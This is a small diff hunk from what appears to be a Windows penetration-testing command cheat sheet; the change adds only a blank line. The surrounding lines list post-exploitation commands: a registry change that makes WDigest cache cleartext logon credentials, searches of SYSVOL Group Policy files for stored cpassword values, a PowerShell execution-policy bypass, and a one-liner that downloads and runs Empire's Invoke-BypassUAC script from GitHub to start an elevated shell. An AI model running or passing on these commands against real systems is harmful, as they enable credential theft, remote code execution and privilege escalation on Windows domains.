@@ -18,6 +18,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLog
 findstr /S cpassword $env:logonserver\sysvol\*.xml
 findstr /S cpassword %logonserver%\sysvol\*.xml
 runas /user:LABS\itadmin /noprofile powershell.exe
+
 powershell -ep bypass
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1')
 Invoke-BypassUAC -Command 'start powershell.exe'
